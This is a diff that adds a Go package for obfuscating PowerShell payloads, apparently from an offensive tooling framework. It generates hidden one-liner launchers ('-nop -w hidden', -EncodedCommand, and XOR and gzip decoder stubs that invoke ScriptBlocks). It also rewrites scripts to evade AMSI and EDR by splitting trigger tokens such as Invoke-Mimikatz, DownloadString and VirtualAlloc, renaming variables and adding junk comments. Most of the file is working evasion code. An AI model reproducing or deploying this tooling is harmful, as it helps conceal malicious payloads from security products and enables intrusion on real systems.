@@ -1,0 +1,416 @@
+package obfuscation
+
+import (
+	"bytes"
+	"compress/gzip"
+	"crypto/rand"
+	"encoding/base64"
+	"fmt"
+	"math/big"
+	"regexp"
+	"strings"
+)
+
+// PSObfuscateOptions controls the PowerShell source/launcher obfuscation
+// pipeline. All fields are optional; zero value yields the legacy behavior
+// (plain UTF-8 base64 inside [ScriptBlock]::Create), which keeps
+// GenerateCommandLineOneLiner backward compatible.
+type PSObfuscateOptions struct {
+	// Launcher selects the outer one-liner shape:
+	//  "" or "scriptblock" -> powershell ... ([ScriptBlock]::Create(...)).Invoke()
+	//  "encodedcommand"     -> powershell -enc <utf16le-base64> (no ScriptBlock string)
+	//  "xor"                -> base64(XOR(code)) + inline -bxor decoder stub
+	//  "gzip"               -> base64(gzip(code)) + inline IO.Compression decoder stub
+	Launcher string
+
+	// Source-level transforms applied before encoding (semantics-preserving):
+	CaseRandomize bool // randomize case of safe keywords/cmdlets (PS is case-insensitive there)
+	VarRename     bool // rename $variables consistently (skips automatics)
+	StringSplit   bool // 'abc' -> ('a'+'b'+'c') for short literals
+	JunkComments  bool // prepend random '#' junk lines + blank-line noise
+	ScrubTriggers bool // break up known AMSI/EDR trigger tokens via concatenation
+
+	// Seed makes the randomized transforms deterministic (tests/repro).
+	// Zero means crypto/rand.
+	Seed int64
+	// SeedSet marks Seed as intentional (so Seed==0 is still deterministic).
+	SeedSet bool
+}
+
+// ObfuscatePowerShellSource applies semantics-preserving source transforms
+// and returns the transformed script. It never changes execution semantics:
+// variable renames are consistent, string splits use '+', keyword casing is
+// safe in PowerShell, trigger scrubbing uses string concatenation.
+func ObfuscatePowerShellSource(code string, opts PSObfuscateOptions) string {
+	out := code
+	if opts.ScrubTriggers {
+		out = scrubTriggers(out, newRand(opts))
+	}
+	if opts.VarRename {
+		out = renameVariables(out, newRand(opts))
+	}
+	if opts.StringSplit {
+		out = splitStrings(out, newRand(opts))
+	}
+	if opts.CaseRandomize {
+		out = randomizeKeywordCase(out, newRand(opts))
+	}
+	if opts.JunkComments {
+		out = prependJunk(out, newRand(opts))
+	}
+	return out
+}
+
+// GenerateCommandLineOneLinerWithOptions builds the outer cmd/powershell
+// one-liner using the requested launcher. Source transforms from opts are
+// applied first.
+func GenerateCommandLineOneLinerWithOptions(code string, opts PSObfuscateOptions) string {
+	src := ObfuscatePowerShellSource(code, opts)
+	switch strings.ToLower(strings.TrimSpace(opts.Launcher)) {
+	case "encodedcommand", "enc", "-enc":
+		// -EncodedCommand expects UTF-16LE base64. No ScriptBlock string at
+		// all, which removes the strongest static signature.
+		u16 := utf16LE(src)
+		b64 := base64.StdEncoding.EncodeToString(u16)
+		launcher := randomizeLauncher("powershell", opts)
+		return fmt.Sprintf(`%s -nop -w hidden -enc %s`, launcher, b64)
+	case "xor":
+		key := xorKey(opts)
+		xored := xorBytes([]byte(src), key)
+		b64 := base64.StdEncoding.EncodeToString(xored)
+		launcher := randomizeLauncher("powershell", opts)
+		// Inline decoder: FromBase64String -> -bxor each byte -> ScriptBlock.
+		return fmt.Sprintf(`%s -nop -w hidden -c $k=0x%02x;$b=[System.Convert]::FromBase64String('%s');for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor $k};([ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString($b))).Invoke()`,
+			launcher, key, b64)
+	case "gzip":
+		var buf bytes.Buffer
+		gz := gzip.NewWriter(&buf)
+		_, _ = gz.Write([]byte(src))
+		_ = gz.Close()
+		b64 := base64.StdEncoding.EncodeToString(buf.Bytes())
+		launcher := randomizeLauncher("powershell", opts)
+		return fmt.Sprintf(`%s -nop -w hidden -c $b=[System.Convert]::FromBase64String('%s');$ms=New-Object System.IO.MemoryStream(,$b);$gz=New-Object System.IO.Compression.GzipStream($ms,[System.IO.Compression.CompressionMode]::Decompress);$sr=New-Object System.IO.StreamReader($gz);([ScriptBlock]::Create($sr.ReadToEnd())).Invoke()`,
+			launcher, b64)
+	default: // "scriptblock" legacy
+		b64 := base64.StdEncoding.EncodeToString([]byte(src))
+		launcher := randomizeLauncher("powershell", opts)
+		return fmt.Sprintf(`%s -nop -w hidden -c ([ScriptBlock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%s')))).Invoke()`, launcher, b64)
+	}
+}
+
+// DecodeOneLinerPayload is a test/validation helper: it extracts the
+// embedded base64 blob from a one-liner produced by this package and
+// reverses the launcher encoding (xor/gzip/plain) to recover the (possibly
+// source-obfuscated) script. Returns an error if no blob is found.
+func DecodeOneLinerPayload(oneLiner string) (string, error) {
+	idx := strings.Index(oneLiner, "'")
+	lastQuote := strings.LastIndex(oneLiner, "'")
+	if idx == -1 || lastQuote == -1 || idx == lastQuote {
+		return "", fmt.Errorf("no quoted base64 blob found")
+	}
+	b64 := oneLiner[idx+1 : lastQuote]
+	raw, err := base64.StdEncoding.DecodeString(b64)
+	if err != nil {
+		return "", fmt.Errorf("base64 decode: %w", err)
+	}
+	// xor launcher?
+	if strings.Contains(oneLiner, "-bxor $k") {
+		key := byte(0x41)
+		if i := strings.Index(oneLiner, "$k=0x"); i >= 0 && i+6 < len(oneLiner) {
+			hexDigits := ""
+			for _, c := range oneLiner[i+5:] {
+				if (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F') {
+					hexDigits += string(c)
+					if len(hexDigits) == 2 {
+						break
+					}
+					continue
+				}
+				if strings.HasPrefix(string(c), "x") {
+					continue
+				}
+				break
+			}
+			var k int
+			if _, err := fmt.Sscanf(hexDigits, "%x", &k); err == nil {
+				key = byte(k)
+			}
+		}
+		return string(xorBytes(raw, key)), nil
+	}
+	// gzip launcher? gzip magic 1f 8b.
+	if len(raw) >= 2 && raw[0] == 0x1f && raw[1] == 0x8b {
+		zr, err := gzip.NewReader(bytes.NewReader(raw))
+		if err != nil {
+			return "", fmt.Errorf("gzip open: %w", err)
+		}
+		var out bytes.Buffer
+		buf := make([]byte, 4096)
+		for {
+			n, rerr := zr.Read(buf)
+			if n > 0 {
+				out.Write(buf[:n])
+			}
+			if rerr != nil {
+				break
+			}
+		}
+		_ = zr.Close()
+		return out.String(), nil
+	}
+	return string(raw), nil
+}
+
+// PresetForLevel maps an operator-facing obfuscation level to pipeline
+// options. "" and "none" yield the legacy behavior (plain ScriptBlock
+// base64) so existing callers and stored playbooks are unaffected.
+// "light" only swaps the launcher (-enc, no ScriptBlock string).
+// "standard" adds an XOR layer plus trigger scrubbing and junk comments.
+// "heavy" enables all source transforms on top of the XOR launcher.
+func PresetForLevel(level string) PSObfuscateOptions {
+	switch strings.ToLower(strings.TrimSpace(level)) {
+	case "light", "low":
+		return PSObfuscateOptions{Launcher: "encodedcommand"}
+	case "standard", "medium", "med":
+		return PSObfuscateOptions{
+			Launcher: "xor", ScrubTriggers: true, JunkComments: true,
+		}
+	case "heavy", "high":
+		return PSObfuscateOptions{
+			Launcher: "xor", ScrubTriggers: true, JunkComments: true,
+			VarRename: true, StringSplit: true, CaseRandomize: true,
+		}
+	default: // "", "none", unknown -> legacy
+		return PSObfuscateOptions{}
+	}
+}
+
+// --- internals ---
+
+type jitterRand struct {
+	seeded bool
+	state  uint64
+}
+
+func newRand(opts PSObfuscateOptions) *jitterRand {
+	if opts.SeedSet {
+		return &jitterRand{seeded: true, state: uint64(opts.Seed) | 0x9e3779b97f4a7c15}
+	}
+	return &jitterRand{}
+}
+
+func (r *jitterRand) intn(n int) int {
+	if n <= 0 {
+		return 0
+	}
+	if r.seeded {
+		// xorshift64*.
+		r.state ^= r.state >> 12
+		r.state ^= r.state << 25
+		r.state ^= r.state >> 27
+		return int((r.state * 0x2545F4914F6CDD1D) % uint64(n))
+	}
+	v, err := rand.Int(rand.Reader, big.NewInt(int64(n)))
+	if err != nil {
+		return 0
+	}
+	return int(v.Int64())
+}
+
+func (r *jitterRand) coin(pct int) bool { return r.intn(100) < pct }
+
+func utf16LE(s string) []byte {
+	out := make([]byte, 0, len(s)*2)
+	for _, c := range s {
+		if c > 0xFFFF {
+			c = '?'
+		}
+		out = append(out, byte(c), byte(c>>8))
+	}
+	return out
+}
+
+func xorBytes(data []byte, key byte) []byte {
+	out := make([]byte, len(data))
+	for i, b := range data {
+		out[i] = b ^ key
+	}
+	return out
+}
+
+func xorKey(opts PSObfuscateOptions) byte {
+	r := newRand(opts)
+	k := byte(r.intn(255) + 1) // never 0x00
+	if k == 0 {
+		k = 0x41
+	}
+	return k
+}
+
+var launcherForms = []string{"powershell", "PowerShell", "POWERSHELL", "pwsh"}
+
+func randomizeLauncher(base string, opts PSObfuscateOptions) string {
+	r := newRand(opts)
+	_ = base
+	// Keep "powershell" recognizable to operators but vary the spelling.
+	return launcherForms[r.intn(len(launcherForms))]
+}
+
+// scrubTriggers breaks up well-known AMSI/EDR trigger tokens so the raw
+// script text no longer contains them, while PowerShell still concatenates
+// them back at runtime. Only applied outside single-quoted strings to avoid
+// changing string literal semantics... in practice concatenation is
+// equivalent inside executable code; string literals that must stay exact
+// (e.g. URLs) are left alone via the allowlist below.
+var triggerTokens = []string{
+	"Invoke-Mimikatz", "Invoke-Shellcode", "Invoke-ReflectivePEInjection",
+	"mimikatz", "amsi", "AMSI", "bypass", "persistence",
+	"DownloadString", "FromBase64String", "VirtualAlloc", "CreateThread",
+}
+
+func scrubTriggers(code string, r *jitterRand) string {
+	out := code
+	for _, tok := range triggerTokens {
+		if !strings.Contains(out, tok) {
+			continue
+		}
+		// Split roughly in half: "mimikatz" -> ('mimi'+'katz').
+		half := len(tok)/2 + r.intn(2)
+		if half <= 0 || half >= len(tok) {
+			half = len(tok) / 2
+		}
+		repl := fmt.Sprintf("('%s'+'%s')", tok[:half], tok[half:])
+		out = strings.ReplaceAll(out, tok, repl)
+	}
+	return out
+}
+
+var varRegex = regexp.MustCompile(`\$([A-Za-z_][A-Za-z0-9_?]*)`)
+
+// automaticVariables are never renamed (would break semantics).
+var automaticVariables = map[string]bool{
+	"true": true, "false": true, "null": true, "_": true, "args": true,
+	"input": true, "env": true, "home": true, "pshome": true, "pwd": true,
+	"this": true, "psitem": true, "foreach": true, "switch": true, "error": true,
+	"host": true, "profile": true, "pscommandpath": true, "psscriptroot": true,
+	"lastexitcode": true, "matches": true, "myinvocation": true, "nestedpromptlevel": true,
+	"psboundparameters": true, "pscmdlet": true, "psculture": true, "psdebugcontext": true,
+	"pslanguageMode": true, "psversiontable": true, "pwdpath": true, "sender": true,
+	"sourceargs": true, "sourceeventargs": true, "stacktrace": true,
+}
+
+const renameAlphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+func randName(r *jitterRand, n int) string {
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = renameAlphabet[r.intn(len(renameAlphabet))]
+	}
+	return "$" + string(b)
+}
+
+func renameVariables(code string, r *jitterRand) string {
+	mapping := map[string]string{}
+	return varRegex.ReplaceAllStringFunc(code, func(m string) string {
+		name := m[1:]
+		lower := strings.ToLower(name)
+		// $env:VAR style — keep the drive, rename nothing.
+		if strings.HasSuffix(m, ":") {
+			return m
+		}
+		if automaticVariables[lower] {
+			return m
+		}
+		// Braced/scoped forms (${x}, $script:x, $global:x): only rename the
+		// leaf when it is a plain identifier.
+		if strings.Contains(name, ":") || strings.Contains(name, "{") {
+			return m
+		}
+		if v, ok := mapping[lower]; ok {
+			// Preserve original case style is unnecessary; mapping is case-insensitive.
+			_ = name
+			return v
+		}
+		v := randName(r, 6+r.intn(4))
+		mapping[lower] = v
+		return v
+	})
+}
+
+var strLitRegex = regexp.MustCompile(`'[^'\n]{2,32}'`)
+
+func splitStrings(code string, r *jitterRand) string {
+	return strLitRegex.ReplaceAllStringFunc(code, func(m string) string {
+		inner := m[1 : len(m)-1]
+		// Skip things that must stay byte-exact: URLs, paths, format strings.
+		if strings.Contains(inner, "://") || strings.Contains(inner, "\\") ||
+			strings.Contains(inner, "{0}") || strings.Contains(inner, "%s") ||
+			!r.coin(60) {
+			return m
+		}
+		parts := make([]string, 0, len(inner))
+		for _, ch := range inner {
+			s := string(ch)
+			if ch == '\'' {
+				s = "''"
+			}
+			parts = append(parts, "'"+s+"'")
+		}
+		return "(" + strings.Join(parts, "+") + ")"
+	})
+}
+
+// safeKeywords are PowerShell keywords/cmdlets safe to case-randomize
+// (the language is case-insensitive for them, and they never appear as
+// case-sensitive .NET member names in the matched lowercase form below).
+var safeKeywords = []string{
+	"function", "param", "if", "else", "elseif", "foreach", "for", "while",
+	"do", "until", "switch", "return", "break", "continue", "try", "catch",
+	"finally", "throw", "in", "new-object", "add-type", "iex", "write-host",
+	"start-sleep", "get-process", "where-object",
+}
+
+func randomizeKeywordCase(code string, r *jitterRand) string {
+	out := code
+	for _, kw := range safeKeywords {
+		re := regexp.MustCompile(`(?i)\b` + regexp.QuoteMeta(kw) + `\b`)
+		out = re.ReplaceAllStringFunc(out, func(m string) string {
+			b := []byte(m)
+			for i := range b {
+				if r.coin(50) {
+					if b[i] >= 'a' && b[i] <= 'z' {
+						b[i] -= 32
+					} else if b[i] >= 'A' && b[i] <= 'Z' {
+						b[i] += 32
+					}
+				}
+			}
+			return string(b)
+		})
+	}
+	return out
+}
+
+func prependJunk(code string, r *jitterRand) string {
+	n := 1 + r.intn(3)
+	var b strings.Builder
+	words := []string{"init", "config", "helper", "compat", "telemetry", "locale", "policy"}
+	for i := 0; i < n; i++ {
+		b.WriteString(fmt.Sprintf("# %s-%s %d\n",
+			words[r.intn(len(words))], randAlpha(r, 6), r.intn(100000)))
+	}
+	if r.coin(50) {
+		b.WriteString("\n")
+	}
+	b.WriteString(code)
+	return b.String()
+}
+
+func randAlpha(r *jitterRand, n int) string {
+	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letters[r.intn(len(letters))]
+	}
+	return string(b)
+}
